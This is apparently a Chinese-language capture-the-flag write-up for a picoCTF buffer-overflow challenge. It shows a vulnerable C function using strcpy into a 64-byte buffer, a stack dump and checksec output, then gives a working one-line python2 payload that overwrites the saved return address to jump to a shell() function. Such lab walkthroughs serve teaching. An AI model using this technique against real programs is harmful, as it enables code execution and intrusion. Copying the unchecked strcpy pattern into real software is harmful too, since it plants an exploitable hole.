# 代码审计
```
void shell(void) {
    execl("/bin/sh", "sh", NULL);
}

void vuln(char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 21, (void **) &str);
}
```
这时不再是修改变量，而是要跳到一个函数执行

从linux函数执行的步骤来说，函数的返回地址会放在栈上

>Stack dump:
0xff98cb00: 0xff98d2fd (first argument)
0xff98cafc: 0x080486bc (saved eip)  ←这里就是函数执行完后返回的地址
0xff98caf8: 0xff98cb28 (saved ebp)
0xff98caf4: 0xf7000804
0xff98caf0: 0x85c2b8c3
0xff98caec: 0x61616161
0xff98cae8: 0x61616161
0xff98cae4: 0x61616161
0xff98cae0: 0x61616161
0xff98cadc: 0x61616161
0xff98cad8: 0x61616161
0xff98cad4: 0x61616161
0xff98cad0: 0x61616161
0xff98cacc: 0x61616161
0xff98cac8: 0x61616161
0xff98cac4: 0x61616161
0xff98cac0: 0x61616161
0xff98cabc: 0x61616161
0xff98cab8: 0x61616161
0xff98cab4: 0x61616161
0xff98cab0: 0x61616161 (beginning of buffer

查看程序保护措施
>➜  overflow3 checksec overflow3 
[*] '/home/mjr/Desktop/pico/overflow3/overflow3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

没有什么保护措施，NO PIE所以函数的地址是相同的，而且从打印中我们直接得到shell函数的地址
>shell function = 0x80485f8

再计算偏移
>'a'*76+0x80485f8

# 利用

```
./overflow3 `python2 -c "print 'a'*76+'\xf8\x85\x04\x08'"`
```
getshell